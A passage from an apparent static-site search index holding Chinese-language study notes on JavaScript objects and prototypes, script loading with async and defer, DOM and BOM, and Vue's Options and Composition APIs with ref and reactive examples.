\u7279\u6b8a\u503c RegExp\u3001Date\u3001Number\u3001String\u3001Boolean\u3001Function\u3001Array\u3001Object \u6784\u9020\u51fd\u6570 Error\u3001EvalError\u3001RangeError\u3001ReferenceError\u3001SyntaxError\u3001TypeError\u3001URIError \u6784\u9020\u51fd\u6570 <p>ECMAScript \u6ca1\u6709\u660e\u786e\u652f\u6301\u5982\u4f55\u76f4\u63a5\u8bbf\u95ee Global \u5bf9\u8c61\uff0c\u4f46 Web \u6d4f\u89c8\u5668\u90fd\u662f\u5c06\u8fd9\u4e2a\u5bf9\u8c61\u4f5c\u4e3a <code>window</code> \u5bf9\u8c61\u7684\u4e00\u90e8\u5206\u52a0\u4ee5\u5b9e\u73b0\u7684\u3002\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7 <code>window</code> \u5bf9\u8c61\u6765\u8bbf\u95ee\u3002</p>"},{"location":"web/javascript/object/#_2","title":"\u5bf9\u8c61\u539f\u578b","text":"<p>\u901a\u8fc7 <code>\u539f\u578b</code> \u8fd9\u79cd\u673a\u5236\uff0cJavaScript \u4e2d\u7684\u5bf9\u8c61\u4ece\u5176\u4ed6\u5bf9\u8c61\u7ee7\u627f\u529f\u80fd\u7279\u6027\uff1b\u8fd9\u79cd\u7ee7\u627f\u673a\u5236\u4e0e\u7ecf\u5178\u7684\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u8bed\u8a00\u7684\u7ee7\u627f\u673a\u5236\u4e0d\u540c\u3002</p> <p>\u6bcf\u4e2a\u51fd\u6570\u90fd\u6709\u4e00\u4e2a <code>prototype</code> \uff08\u539f\u578b\uff09\u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\u3002\u8be5\u5bf9\u8c61\u7684\u7528\u9014\u662f\u5305\u542b\u53ef\u4ee5\u7531\u7279\u5b9a\u7c7b\u578b\u7684\u6240\u6709\u5b9e\u4f8b\u5171\u4eab\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p> <p>ECMAScript \u4ec5\u4ec5\u652f\u6301\u5b9e\u73b0\u7ee7\u627f\uff08\u4e0d\u652f\u6301\u63a5\u53e3\u7ee7\u627f\uff09\uff0c\u901a\u8fc7**\u539f\u578b\u94fe**\u6765\u5b9e\u73b0\u3002</p>"},{"location":"web/javascript/overview/","title":"\u7b80\u4ecb\u53ca\u5f15\u7528","text":""},{"location":"web/javascript/overview/#js","title":"JS \u7b80\u4ecb","text":"<p>HTML \u5b9a\u4e49\u9759\u6001\u5185\u5bb9\uff0cCSS \u7f8e\u5316\u5185\u5bb9\uff0cJS \u5b9e\u73b0\u52a8\u6001\u5185\u5bb9\u3002</p> <p>\u5728 HTML \u548c CSS \u96c6\u5408\u7ec4\u88c5\u6210\u4e00\u4e2a\u7f51\u9875\u540e\uff0c\u6d4f\u89c8\u5668\u7684 JavaScript \u5f15\u64ce\u5c06\u6267\u884c JavaScript \u4ee3\u7801\uff0c\u56e0\u4e3a JavaScript \u6700\u666e\u904d\u7684\u7528\u5904\u662f\u901a\u8fc7 DOM API \u52a8\u6001\u4fee\u6539 HTML \u548c CSS \u6765\u66f4\u65b0\u7528\u6237\u754c\u9762\u3002</p> <p>\u5982\u679c JavaScript \u5728 HTML \u548c CSS \u5c31\u4f4d\u4e4b\u524d\u52a0\u8f7d\u8fd0\u884c\uff0c\u5c31\u4f1a\u5f15\u53d1\u9519\u8bef\u3002</p> <p>JS \u662f\u89e3\u91ca\u6027\u8bed\u8a00\uff0c\u52a8\u6001\u7c7b\u578b\uff08\u4e0d\u9700\u8981\u6307\u5b9a\u53d8\u91cf\u5c06\u5305\u542b\u4ec0\u4e48\u6570\u636e\u7c7b\u578b\uff09\u3002</p> <p>\u6ce8\u610f\uff1a\u4e0d\u540c\u4e8e HTML \u548c CSS\uff0cJS \u533a\u5206\u5927\u5c0f\u5199\uff01</p> <p>\u4e00\u4e2a\u5b8c\u6574\u7684 JavaScript \u5b9e\u73b0\u5e94\u8be5\u7531\u4e0b\u5217\u4e09\u4e2a\u4e0d\u540c\u7684\u90e8\u5206\u7ec4\u6210\uff1a</p> <ul> <li>\u6838\u5fc3(ECMAScript)</li> <li>\u6587\u6863\u5bf9\u8c61\u6a21\u578b(DOM)</li> <li>\u6d4f\u89c8\u5668\u5bf9\u8c61\u6a21\u578b(BOM)</li> </ul>"},{"location":"web/javascript/overview/#ecmascript","title":"ECMAScript","text":"<p>\u7531 ECMA-262 \u5b9a\u4e49\u7684 ECMAScript \u4e0e Web \u6d4f\u89c8\u5668\u6ca1\u6709\u5fc5\u987b\u7684\u4f9d\u8d56\u5173\u7cfb\uff0cWeb \u6d4f\u89c8\u5668\u53ea\u662f ECMAScript \u5b9e\u73b0\u53ef\u80fd\u7684 <code>\u5bbf\u4e3b\u73af\u5883</code>(e.g. Node\u3001Adobe Flash) \u4e4b\u4e00\u3002</p> <p>\u5bbf\u4e3b\u73af\u5883\u4e0d\u4ec5\u80fd\u63d0\u4f9b\u57fa\u672c\u7684 ECMAScript \u5b9e\u73b0\uff0c\u540c\u65f6\u4e5f\u4f1a\u63d0\u4f9b\u8be5\u8bed\u8a00\u7684\u6269\u5c55(e.g. DOM)\uff0c\u4ee5\u4fbf\u8bed\u8a00\u4e0e\u73af\u5883\u4e4b\u95f4\u5bf9\u63a5\u4ea4\u4e92\u3002</p> <p>Web \u6d4f\u89c8\u5668\u5bf9 ECMAScript \u7684\u652f\u6301\u5c31\u662f JavaScript\uff0c\u800c Adobe ActionScript \u4e5f\u5b9e\u73b0\u4e86\u5bf9 ECMAScript \u7684\u652f\u6301\u3002</p>"},{"location":"web/javascript/overview/#dom","title":"DOM","text":"<p>DOM \u662f\u9488\u5bf9 XML \u4f46\u7ecf\u8fc7\u6269\u5c55\u7528\u4e8e HTML \u7684\u5e94\u7528\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3(API)\u3002</p> <p>DOM \u628a\u6574\u4e2a\u9875\u9762\u6620\u5c04\u4e3a\u4e00\u4e2a\u591a\u5c42\u8282\u70b9\u7ed3\u6784\uff0cHTML \u6216 XML \u9875\u9762\u4e2d\u7684\u6bcf\u4e2a\u7ec4\u6210\u90e8\u5206\u90fd\u662f\u67d0\u79cd\u7c7b\u578b\u7684\u8282\u70b9\uff0c\u8fd9\u4e9b\u8282\u70b9\u53c8\u5305\u542b\u7740\u4e0d\u540c\u7c7b\u578b\u7684\u6570\u636e\u3002</p> <p>\u5982\u4e0b HTML \u9875\u9762\uff1a</p> <pre><code>&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;Sample Page&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;p&gt;Hello World!&lt;/p&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>DOM \u5982\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"web/javascript/overview/#bom","title":"BOM","text":"<p>\u4ece\u6839\u672c\u4e0a\u8bb2\uff0cBOM \u53ea\u5904\u7406\u6d4f\u89c8\u5668\u7a97\u53e3\u548c\u6846\u67b6\uff0c\u4f46\u4eba\u4eec\u4e60\u60ef\u4e0a\u4e5f\u628a\u6240\u6709\u9488\u5bf9\u6d4f\u89c8\u5668\u7684 JS \u6269\u5c55\u7b97\u4f5c BOM \u7684\u4e00\u90e8\u5206\uff0c\u5982\uff1a</p> <ul> <li>\u5bf9 cookies \u7684\u652f\u6301</li> <li>\u50cf XMLHttpRequest \u548c IE \u7684 AxtiveXObject \u7b49\u81ea\u5b9a\u4e49\u5bf9\u8c61</li> <li>navigator\u3001location\u3001screen \u7b49\u5bf9\u8c61</li> <li>...</li> </ul> <p>\u7531\u4e8e\u6ca1\u6709 BOM \u6807\u51c6\u53ef\u4ee5\u9075\u5faa\uff0c\u56e0\u6b64\u6bcf\u4e2a\u6d4f\u89c8\u5668\u90fd\u6709\u81ea\u5df1\u7684\u5b9e\u73b0\u3002</p>"},{"location":"web/javascript/overview/#html-js","title":"\u5411 HTML \u6dfb\u52a0 JS","text":"<pre><code>&lt;head&gt;\n        &lt;!-- \u5185\u90e8JavaScript --&gt;\n    &lt;script&gt;\n        document.addEventListener(\"DOMContentLoaded\", function () {\n            function createParagraph() {\n                let para = document.createElement('p');\n                para.textContent = '\u4f60\u70b9\u51fb\u4e86\u8fd9\u4e2a\u6309\u94ae\uff01';\n                document.body.appendChild(para);\n            }\n\n            const buttons = document.querySelectorAll('button');\n\n            for (let i = 0; i &lt; buttons.length; i++) {\n                buttons[i].addEventListener('click', createParagraph);\n            }\n        });\n    &lt;/script&gt;\n\n        &lt;!-- \u5916\u90e8JavaScript --&gt;\n    &lt;/script&gt;\n    &lt;script src=\"myScript.js\" async&gt;&lt;/script&gt;\n\n&lt;/head&gt;\n</code></pre> <p>\u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u5185\u5d4c JS\uff0c\u4f46\u6781\u5176\u4e0d\u5efa\u8bae\u4f7f\u7528\uff01</p> <p><code>&lt;script&gt;</code> \u5b9a\u4e49\u4e86 6 \u4e2a\u5c5e\u6027</p> <ul> <li>async\uff1a\u5f02\u6b65\u811a\u672c\u3002\u5e94\u8be5\u7acb\u5373\u4e0b\u8f7d\u811a\u672c\uff0c\u4f46\u4e0d\u5e94\u59a8\u788d\u9875\u9762\u4e2d\u7684\u5176\u4ed6\u64cd\u4f5c\uff0c\u6bd4\u5982\u4e0b\u8f7d\u5176\u4ed6\u8d44\u6e90\u6216\u7b49\u5f85\u52a0\u8f7d\u5176\u4ed6\u811a\u672c\u3002\u53ea\u5bf9\u5916\u90e8\u811a\u672c\u6587\u4ef6\u6709\u6548\u3002</li> <li>defer\uff1a\u5ef6\u8fdf\u811a\u672c\u3002\u8868\u793a\u811a\u672c\u53ef\u4ee5\u5ef6\u8fdf\u5230\u6587\u6863\u5b8c\u5168\u88ab\u89e3\u6790\u548c\u663e\u793a\u540e\u518d\u6267\u884c\u3002\u53ea\u5bf9\u5916\u90e8\u811a\u672c\u6587\u4ef6\u6709\u6548\u3002</li> <li>charset\uff1a\u8868\u793a\u901a\u8fc7 src \u5c5e\u6027\u6307\u5b9a\u7684\u4ee3\u7801\u7684\u5b57\u7b26\u96c6\u3002\u5927\u591a\u6570\u6d4f\u89c8\u5668\u4f1a\u5ffd\u7565\u8be5\u503c\uff0c\u5f88\u5c11\u4f7f\u7528\u3002</li> <li>src\uff1a\u8868\u793a\u5305\u542b\u8981\u6267\u884c\u4ee3\u7801\u7684\u5916\u90e8\u6587\u4ef6</li> <li>language\uff1a\u5df2\u5e9f\u5f03\uff0c\u539f\u7528\u4e8e\u8868\u793a\u7f16\u5199\u4ee3\u7801\u4f7f\u7528\u7684\u811a\u672c\u8bed\u8a00\u3002</li> <li>type\uff1a\u4e0d\u662f\u5fc5\u987b\u7684\uff0c\u9ed8\u8ba4\u4e3a text/javascript</li> </ul>"},{"location":"web/javascript/overview/#_2","title":"\u811a\u672c\u8c03\u7528\u7b56\u7565","text":"<p>\u82e5 JS \u64cd\u4f5c DOM\uff0c\u4f46 JS \u5728 HTML \u5143\u7d20\u4e4b\u524d\u52a0\u8f7d\uff0c\u5219\u4ee3\u7801\u5c06\u51fa\u9519\u3002</p> <p>\u7136\u800c\uff0cJS \u5728 <code>&lt;head&gt;</code> \u4e2d\u5f15\u5165\uff0c\u89e3\u6790\u4e8e HTML \u6587\u6863\u4f53 <code>&lt;body&gt;</code> \u4e4b\u524d\uff0c\u56e0\u6b64\u5b58\u5728\u9690\u60a3\uff0c\u9700\u8981\u4e00\u4e9b\u65b9\u6cd5\u907f\u514d\u9519\u8bef\u53d1\u751f\u3002</p> <p>\u518d\u770b\u5411 HTML \u6dfb\u52a0 JS \u7684\u4ee3\u7801\uff1a</p> <ul> <li>\u5185\u90e8 JavaScript</li> </ul> <pre><code>/* \u76d1\u542c\u5668\uff0c\u76d1\u542c\u6d4f\u89c8\u5668\u7684 \"DOMContentLoaded\" \u4e8b\u4ef6\uff0c\u5373 HTML \u6587\u6863\u4f53\u52a0\u8f7d\u3001\u89e3\u91ca\u5b8c\u6bd5\u4e8b\u4ef6\u3002\n\u4e8b\u4ef6\u89e6\u53d1\u65f6\u624d\u8c03\u7528\u4e4b\u540e\u7684\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u4e86\u9519\u8bef\u53d1\u751f */\ndocument.addEventListener(\"DOMContentLoaded\", function() {\n  . . .\n});\n</code></pre> <ul> <li>\u5916\u90e8 JavaScript</li> </ul> <pre><code>/* \u4f7f\u7528\u5f02\u6b65(async)\u5c5e\u6027\n\u5b83\u544a\u77e5\u6d4f\u89c8\u5668\u5728\u9047\u5230 &lt;script&gt; \u5143\u7d20\u65f6\u4e0d\u8981\u4e2d\u65ad\u540e\u7eed HTML \u5185\u5bb9\u7684\u52a0\u8f7d */\n&lt;script src=\"myScript.js\" async&gt;&lt;/script&gt;\n</code></pre> <p>\u8fd9\u4e24\u79cd\u662f\u8f83\u4e3a\u5148\u8fdb\u9ad8\u6548\u7684\u89e3\u51b3\u529e\u6cd5\uff0c\u5728\u6b64\u4e4b\u524d\uff0c\u65e7\u529e\u6cd5\u662f\u628a\u811a\u672c\u5143\u7d20\u653e\u5728\u6587\u6863\u4f53\u7684\u5e95\u90e8\uff0c\u53ea\u6709\u5728\u6240\u6709 HTML DOM \u52a0\u8f7d\u5b8c\u6210\u540e\u624d\u5f00\u59cb\u811a\u672c\u7684\u52a0\u8f7d/\u89e3\u6790\u8fc7\u7a0b\u3002</p> <p>\u8be5\u65b9\u6cd5\u6709\u663e\u8457\u7684\u6027\u80fd\u635f\u8017\u3002</p>"},{"location":"web/javascript/overview/#async-defer","title":"async \u548c defer","text":"<p>\u53c2\u8003: defer \u548c async \u7684\u533a\u522b</p> <ul> <li>\u5982\u679c\u811a\u672c\u65e0\u9700\u7b49\u5f85\u9875\u9762\u89e3\u6790\uff0c\u4e14\u65e0\u4f9d\u8d56\u72ec\u7acb\u8fd0\u884c\uff0c\u90a3\u4e48\u5e94\u4f7f\u7528 \u00a0<code>async</code>\u3002</li> <li>\u5982\u679c\u811a\u672c\u9700\u8981\u7b49\u5f85\u9875\u9762\u89e3\u6790\uff0c\u4e14\u4f9d\u8d56\u4e8e\u5176\u5b83\u811a\u672c\uff08\u811a\u672c\u987a\u5e8f\u52a0\u8f7d\uff09\uff0c\u8c03\u7528\u8fd9\u4e9b\u811a\u672c\u65f6\u5e94\u4f7f\u7528 \u00a0<code>defer</code>\uff0c\u5c06\u5173\u8054\u7684\u811a\u672c\u6309\u6240\u9700\u987a\u5e8f\u7f6e\u4e8e HTML \u4e2d\u3002</li> </ul> <p>Warning</p> <p>\u4efb\u4f55\u65f6\u5019\u90fd\u5e94\u8be5\u9009\u4e2d async \u6216 defer\uff0c\u800c\u4e0d\u662f\u4ec0\u4e48\u90fd\u4e0d\u8f93\u5165\uff01</p>"},{"location":"web/vue/api/","title":"API","text":""},{"location":"web/vue/api/#api_1","title":"\u9009\u9879\u5f0f API","text":"<p>Vue \u7684\u5f00\u53d1\u6709\u4e24\u79cd\u65b9\u5f0f\uff0c\u4e00\u79cd\u662f Vue2 \u5c31\u5f00\u59cb\u652f\u6301\u7684<code>Options API</code> \u3002\u53e6\u4e00\u79cd\u662f Vue3 \u7684\u65b0\u7279\u6027 <code>Composition API</code> \u3002</p> <p>\u6839\u636e\u5b98\u65b9 API \u6587\u6863\uff0c\u5171\u6709\u5982\u4e0b\u51e0\u7c7b\u9009\u9879\uff1a</p>"},{"location":"web/vue/api/#data","title":"Data\uff1a\u64cd\u4f5c\u6570\u636e\u7684\u9009\u9879","text":"<ul> <li>props\uff1a\u7528\u4e8e\u4ece\u7236\u7ec4\u4ef6\u63a5\u6536\u6570\u636e\u7684\u6570\u7ec4\u6216\u5bf9\u8c61\u3002\u4f7f\u7528\u5bf9\u8c61\u65f6\uff0c\u53ef\u4ee5\u9a8c\u8bc1\u6570\u636e\u7684\u7c7b\u578b\u7b49\u7b49\u3002</li> <li>data\uff1a\u5b9a\u4e49\u54cd\u5e94\u5f0f\u6570\u636e</li> <li>methods\uff1a\u65b9\u6cd5</li> <li>computed\uff1a\u8ba1\u7b97\u5c5e\u6027\uff0c\u5e95\u5c42\u5b9e\u73b0\u548c methods \u76f8\u540c\uff0c\u4f46\u5b58\u5728\u7f13\u5b58\u3002</li> <li>watch\uff1a\u4fa6\u542c\u5668\uff0c\u5927\u90e8\u5206\u65f6\u5019\u5e94\u8be5\u4f7f\u7528 computed \u5b9e\u73b0\uff0c\u800c\u4e0d\u662f watch\u3002\u5f88\u5bb9\u6613\u6ee5\u7528\uff01</li> <li>emits\u3001expose</li> </ul>"},{"location":"web/vue/api/#domdom","title":"DOM\uff1aDOM \u76f8\u5173\u7684\u9009\u9879","text":"<ul> <li>template\uff1a\u4e00\u4e2a\u5b57\u7b26\u4e32\u6a21\u677f\uff0c\u7528\u4f5c component \u5b9e\u4f8b\u7684\u6807\u8bb0\u3002\u6a21\u677f\u5c06\u4f1a**\u66ff\u6362**\u6240\u6302\u8f7d\u5143\u7d20\u7684 \u00a0<code>innerHTML</code>\u3002\u6302\u8f7d\u5143\u7d20\u7684\u4efb\u4f55\u73b0\u6709\u6807\u8bb0\u90fd\u5c06\u88ab\u5ffd\u7565\uff0c\u9664\u975e\u6a21\u677f\u4e2d\u5b58\u5728\u901a\u8fc7\u63d2\u69fd\u5206\u53d1\u7684\u5185\u5bb9\u3002</li> <li>render</li> </ul>"},{"location":"web/vue/api/#_1","title":"\u751f\u547d\u5468\u671f\u94a9\u5b50","text":"<p>\u6bcf\u4e2a\u7ec4\u4ef6\u5728\u88ab\u521b\u5efa\u65f6\u90fd\u8981\u7ecf\u8fc7\u4e00\u7cfb\u5217\u7684\u521d\u59cb\u5316\u8fc7\u7a0b\u2014\u2014\u4f8b\u5982\uff0c\u9700\u8981\u8bbe\u7f6e\u6570\u636e\u76d1\u542c\u3001\u7f16\u8bd1\u6a21\u677f\u3001\u5c06\u5b9e\u4f8b\u6302\u8f7d\u5230 DOM \u5e76\u5728\u6570\u636e\u53d8\u5316\u65f6\u66f4\u65b0 DOM \u7b49\u3002\u540c\u65f6\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u4e5f\u4f1a\u8fd0\u884c\u4e00\u4e9b\u53eb\u505a \u751f\u547d\u5468\u671f\u94a9\u5b50 \u7684\u51fd\u6570\uff0c\u8fd9\u7ed9\u4e86\u7528\u6237\u5728\u4e0d\u540c\u9636\u6bb5\u6dfb\u52a0\u81ea\u5df1\u7684\u4ee3\u7801\u7684\u673a\u4f1a\u3002</p> <ul> <li>created</li> <li>mounted</li> <li>updated</li> <li>...</li> </ul>"},{"location":"web/vue/api/#_2","title":"\u8d44\u6e90","text":"<ul> <li>directive\uff1a\u58f0\u660e\u4e00\u7ec4\u53ef\u7528\u4e8e\u7ec4\u4ef6\u5b9e\u4f8b\u4e2d\u7684\u6307\u4ee4</li> <li>components\uff1a\u58f0\u660e\u4e00\u7ec4\u53ef\u7528\u4e8e\u7ec4\u4ef6\u5b9e\u4f8b\u4e2d\u7684\u7ec4\u4ef6\u3002</li> <li>\u7ec4\u5408\uff1a</li> <li>setup\uff1aVue3 \u4e2d\u65b0\u7684\u7ec4\u4ef6\u9009\u9879\uff0c\u662f\u7ec4\u4ef6\u5185\u90e8\u4f7f\u7528 Composition API \u7684\u5165\u53e3\u70b9\u3002</li> <li>mixins\uff1a\u4e0d\u518d\u63a8\u8350\u4f7f\u7528\u3002\u7528\u4e8e\u5728 Vue2 \u4e2d\u521b\u5efa\u53ef\u91cd\u7528\u7ec4\u4ef6\u3002Vue3 \u4e2d\u66f4\u63a8\u8350\u4f7f\u7528 Composition API\u3002</li> <li>extends\u3001provide/inject</li> </ul>"},{"location":"web/vue/api/#_3","title":"\u6742\u9879","text":"<ul> <li>name\uff1a\u663e\u793a\u58f0\u660e\u7ec4\u4ef6\u7684\u540d\u8bcd\uff0c\u82e5\u6ca1\u6709\u663e\u5f0f\u58f0\u660e\uff0c\u82e5\u5355\u6587\u4ef6\u7ec4\u4ef6 <code>HelloWorld.vue</code> \uff0c\u5219 Vue \u9ed8\u8ba4\u8be5\u7ec4\u4ef6\u540d\u4e3a <code>HelloWorld</code> \u3002\u6211\u4eec\u4e5f\u5e94\u8be5\u5c06\u5176\u663e\u793a\u58f0\u660e\u4e3a <code>HelloWorld</code> \u3002</li> <li>...</li> </ul>"},{"location":"web/vue/api/#api_2","title":"\u7ec4\u5408\u5f0f API","text":"<p>\u5728\u9009\u9879\u5f0f API \u4e2d\uff0c\u6211\u4eec\u5728\u4e00\u4e2a component \u4e2d\u4f7f\u7528 (<code>data</code>\u3001<code>computed</code>\u3001<code>methods</code>\u3001<code>watch</code> \u7b49)\u7ec4\u4ef6 \u9009\u9879 \u6765\u7ec4\u7ec7\u903b\u8f91\u3002</p> <p>\u8fd9\u79cd\u65b9\u5f0f\u867d\u7136\u5f88\u6709\u6548\uff0c\u4f46\u968f\u7740\u7ec4\u4ef6\u7684\u53d8\u5927\uff0c\u903b\u8f91\u5173\u6ce8\u70b9\u7684\u5217\u8868\u4e5f\u4f1a\u589e\u957f\uff0c\u5c24\u5176\u5bf9\u4e8e\u90a3\u4e9b\u4e00\u5f00\u59cb\u6ca1\u6709\u7f16\u5199\u8fd9\u4e9b\u7ec4\u4ef6\u7684\u4eba\u6765\u8bf4\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u7ec4\u4ef6\u96be\u4ee5\u9605\u8bfb\u548c\u7406\u89e3\u3002</p> <p>\u4e14\u5982\u4e00\u4e2a\u7ec4\u4ef6 <code>Content.vue</code> \u4e2d\u53ef\u80fd\u6709\u591a\u4e2a\u529f\u80fd\uff0c\u5982\uff1a\u641c\u7d22\u548c\u7b5b\u9009\u3002</p> <p>\u6b64\u65f6\uff0c\u8fd9\u4e24\u4e2a\u529f\u80fd\u7684\u6570\u636e\u90fd\u5b58\u653e\u5728 data \u4e2d\uff0c\u65b9\u6cd5\u90fd\u5b58\u653e\u5728 methods \u4e2d\uff0c\u5c31\u51fa\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff1a\u5904\u7406\u540c\u4e00\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\u5e76\u4e0d\u8fde\u7eed\u3002</p> <p>\u8fd9\u79cd\u788e\u7247\u5316\u4f7f\u5f97\u7406\u89e3\u548c\u7ef4\u62a4\u590d\u6742\u7ec4\u4ef6\u53d8\u5f97\u56f0\u96be\u3002\u9009\u9879\u7684\u5206\u79bb\u63a9\u76d6\u4e86\u6f5c\u5728\u7684\u903b\u8f91\u95ee\u9898\u3002\u6b64\u5916\uff0c\u5728\u5904\u7406\u5355\u4e2a\u903b\u8f91\u5173\u6ce8\u70b9\u65f6\uff0c\u6211\u4eec\u5fc5\u987b\u4e0d\u65ad\u5730\u201c\u8df3\u8f6c\u201d\u76f8\u5173\u4ee3\u7801\u7684\u9009\u9879\u5757\u3002</p> <p>\u56e0\u6b64\uff0cVue3 \u5f15\u5165\u4e86 \u7ec4\u5408\u5f0f API\uff0c\u5b83\u5c06\u540c\u4e00\u4e2a\u903b\u8f91\u5173\u6ce8\u70b9\u76f8\u5173\u4ee3\u7801\u6536\u96c6\u5728\u4e00\u8d77\u3002</p>"},{"location":"web/vue/api/#setup","title":"\u7ec4\u4ef6\u6807\u7b7e\uff1asetup","text":"<p>\u4e3a\u4e86\u4f7f\u7528\u7ec4\u5408\u5f0f API\uff0c\u5f15\u5165 <code>setup</code> \u7ec4\u4ef6\u6807\u7b7e\uff1a</p> <ul> <li>\u907f\u514d\u5728 setup \u4e2d\u4f7f\u7528 this\u3002\u56e0\u4e3a\u5b83\u4e0d\u4f1a\u627e\u5230\u7ec4\u4ef6\u5b9e\u4f8b\u3002setup \u7684\u8c03\u7528\u53d1\u751f\u5728 \u00a0<code>data</code>\u3001<code>computed</code> \u6216 \u00a0<code>methods</code>\u00a0 \u88ab\u89e3\u6790\u4e4b\u524d\uff0c\u6240\u4ee5\u5b83\u4eec\u65e0\u6cd5\u5728 setup \u4e2d\u88ab\u83b7\u53d6\u3002</li> <li>\u5728\u521b\u5efa\u7ec4\u4ef6\u5b9e\u4f8b\u65f6\uff0c\u5728\u521d\u59cb prop \u89e3\u6790\u4e4b\u540e\u7acb\u5373\u8c03\u7528 \u00a0<code>setup</code>\u3002\u5728\u751f\u547d\u5468\u671f\u65b9\u9762\uff0c\u5b83\u662f\u5728 \u00a0beforeCreate\u00a0 \u94a9\u5b50\u4e4b\u524d\u8c03\u7528\u7684\u3002</li> <li>setup \u9009\u9879\u53ef\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff1a\u2460 props(\u54cd\u5e94\u5f0f) \u2461 context   <pre><code>export default {\n  props: {\n    name: String,\n  },\n  setup(props) {\n    console.log(props.name);\n  },\n};\n</code></pre></li> <li>\u5df2\u77e5 props \u662f\u54cd\u5e94\u5f0f\u7684\uff0c\u4f46 setup \u5185\u90e8\u5b9a\u4e49\u53d8\u91cf\u662f\u975e\u54cd\u5e94\u5f0f\u7684\uff0c\u800c\u672c\u6765\u5728 data()\u4e2d\u5b9a\u4e49\u7684\u503c\u7c7b\u578b\u548c\u5f15\u7528\u7c7b\u578b\u7684\u53d8\u91cf\u90fd\u662f\u54cd\u5e94\u5f0f\u7684\u3002\u56e0\u6b64\u5f15\u5165\u54cd\u5e94\u6027 API\u3002</li> </ul>"},{"location":"web/vue/api/#api_3","title":"\u54cd\u5e94\u6027 API","text":"<p>\u54cd\u5e94\u5f0f API</p> <ul> <li><code>ref</code> \uff0c\u53ef\u4ee5\u5c06\u6570\u503c\u7c7b\u578b\u548c\u5f15\u7528\u7c7b\u578b\u90fd\u53d8\u4e3a\u54cd\u5e94\u5f0f\u3002\u5982\u679c\u662f\u5f15\u7528\u7c7b\u578b\uff0c\u5176\u5185\u90e8\u4f7f\u7528 reactive \u5b9e\u73b0\u3002\u56e0\u6b64\u5f53\u51fa\u73b0\u5f15\u7528\u7c7b\u578b\uff08\u6570\u7ec4\u3001\u5bf9\u8c61\uff09\u7684\u65f6\u5019\uff0c\u5efa\u8bae\u76f4\u63a5\u4f7f\u7528 reactive\uff0c\u8fd9\u6837\u5c31\u4e0d\u7528 <code>xxx.value</code> \u4e86\u3002</li> <li><code>shallowRef</code> \uff0c\u53ea\u80fd\u5c06\u6570\u503c\u7c7b\u578b\u7684\u53d8\u4e3a\u54cd\u5e94\u5f0f\u3002</li> <li><code>reactive</code> \uff0c\u53ea\u80fd\u5c06\u5f15\u7528\u7c7b\u578b\u53d8\u6210\u54cd\u5e94\u5f0f\u3002</li> <li><code>sheallowReactive</code> \uff0c\u53ea\u8bb2\u4f20\u5165\u7684\u5bf9\u8c61\u7684\u7b2c\u4e00\u5c42\u53d8\u4e3a\u54cd\u5e94\u5f0f\u3002</li> <li><code>toRef</code> \uff0c\u4e3a\u6e90\u54cd\u5e94\u5f0f\u5bf9\u8c61\u7684\u67d0\u4e2a property \u65b0\u521b\u5efa\u4e00\u4e2a <code>ref</code> \u3002</li> <li><code>toRefs</code> \uff0c\u7406\u89e3\u4e3a\u6279\u91cf\u7684 <code>toRefs</code> \u3002</li> </ul> ref\u3001reactivate \u793a\u4f8b<pre><code>&lt;template&gt;\n    &lt;!-- \u5728\u6a21\u677f\u91cc\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u5343\u4e07\u4e0d\u8981\u52a0\u4e0a.value\uff0cvue3\u540e\u53f0\u5f53\u770b\u5230\u662fRefImpl\u5bf9\u8c61\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u53d6.value--&gt;\n  &lt;h1&gt;\u59d3\u540d\uff1a{{ name }}&lt;/h1&gt;\n  &lt;h1&gt;\u5e74\u9f84\uff1a{{ age }}&lt;/h1&gt;\n\n  &lt;h1&gt;\u5de5\u4f5c\u79cd\u7c7b_ref\uff1a{{ job_ref.type }}&lt;/h1&gt;\n  &lt;h1&gt;\u5de5\u4f5c\u85aa\u6c34_ref\uff1a{{ job_ref.salary }}&lt;/h1&gt;\n  &lt;h1&gt;\u5de5\u4f5c\u79cd\u7c7b_reactive\uff1a{{ job_reactive.type }}&lt;/h1&gt;\n  &lt;h1&gt;\u5de5\u4f5c\u85aa\u6c34_reactive\uff1a{{ job_reactive.salary }}&lt;/h1&gt;\n  &lt;h1&gt;\u7231\u597d{{ hobby }}&lt;/h1&gt;\n\n  &lt;button @click=\"changeInfo\"&gt;changeInfo&lt;/button&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\nimport { ref, reactive, toRef, toRefs } from \"vue\";\nexport default {\n  setup() {\n    let name = ref(\"\u5f20\u4e09\");\n    let age = ref(18);\n    let job_ref = ref({\n      type: \"\u524d\u7aef\",\n      salary: \"30k\",\n    });\n\n    let job_reactive = reactive({\n      type: \"\u524d\u7aef\",\n      salary: \"30k\",\n    });\n\n    let hobby = reactive([1, 2, 3]);\n\n    function changeInfo() {\n      name.value = \"\u674e\u56db\";\n      age.value = 20;\n      console.log(name); // RefImpl\u5bf9\u8c61\uff0c\u4f9d\u9760 Object.defineProperty()\u7684get set\u5b9e\u73b0\u54cd\u5e94\u5f0f\n\n      job_ref.value.type = \"\u540e\u7aef\";\n      job_ref.value.salary = \"40k\";\n      console.log(job_ref); // RefImpl\u5bf9\u8c61\n      console.log(job_ref.value); // Proxy\u5bf9\u8c61\uff0c\u4f9d\u9760 ES6\u7684Proxy\u5b9e\u73b0\n\n      job_reactive.type = \"\u540e\u7aef\";\n      job_reactive.salary = \"40k\";\n      console.log(job_reactive); // Proxy\u5bf9\u8c61\n\n      